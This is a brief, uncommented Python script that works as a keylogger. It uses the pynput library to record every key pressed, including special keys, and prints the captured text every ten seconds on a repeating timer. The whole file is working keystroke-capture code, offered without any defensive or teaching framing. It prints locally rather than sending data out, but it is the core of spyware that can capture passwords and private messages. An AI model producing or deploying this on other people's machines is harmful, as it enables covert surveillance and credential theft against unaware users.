import pynput.keyboard
import threading

log = ""

def keylogger(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log =""
    timer = threading.Timer(10, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=keylogger)
with keyboard_listener:
    report()
    keyboard_listener.join()
